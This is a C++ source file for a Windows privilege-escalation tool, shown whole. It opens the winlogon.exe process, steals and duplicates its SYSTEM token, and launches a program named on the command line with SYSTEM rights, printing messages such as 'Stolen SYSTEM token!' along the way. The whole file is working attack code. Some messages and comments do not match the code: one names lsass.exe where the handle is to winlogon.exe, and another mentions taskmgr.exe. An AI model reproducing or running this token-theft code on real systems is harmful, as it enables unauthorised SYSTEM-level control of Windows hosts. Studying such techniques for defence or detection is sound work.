#include "common.h"

int wmain(int argc, wchar_t** argv)
{
	// open a handle to winlogon.exe 
	RAII::Handle winlogonHandle(::OpenProcess(PROCESS_ALL_ACCESS, false, FindPid(L"winlogon.exe")));
	if (winlogonHandle.GetHandle() == NULL)
	{
		std::cout << "[-] Could not get a handle to winlogon.exe" << std::endl;
		Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to lsass.exe: 0x" << winlogonHandle.GetHandle() << std::endl;
	
	// open a handle to winlogon's token
	HANDLE systemToken;
	BOOL success = ::OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_DUPLICATE, &systemToken);
	RAII::Handle hSystemToken(systemToken);
	if (!success)
	{
		std::cout << "[-] Could not get SYSTEM token. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] Stolen SYSTEM token!" << std::endl;

	// create a new token and duplicate winlogon's token inside it
	HANDLE newSystemToken = NULL;
	success = ::DuplicateTokenEx
	(
		hSystemToken.GetHandle(),
		TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
		nullptr,
		SecurityImpersonation,
		TokenPrimary,
		&newSystemToken
	);
	RAII::Handle hNewSystemToken(newSystemToken);
	if (!success)
	{
		std::cout << "[-] Failed to call DuplicateTokenEx() on the stolen token. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] SYSTEM token successfully duplicated!" << std::endl;

	// spawn taskmgr.exe using the newly duplicated SYSTEM token
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	success = ::CreateProcessWithTokenW
	(
		hNewSystemToken.GetHandle(),
		NULL,
		argv[1],
		nullptr,
		NULL,
		nullptr,
		nullptr,
		&si,
		&pi
	);
	if (!success)
	{
		std::wcout << L"[-] Failed to spawn " << argv[1] << L" running as SYSTEM. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::wcout << L"[+] Spawned " << argv[1] << L" running as SYSTEM!" << std::endl;

	return 0;
}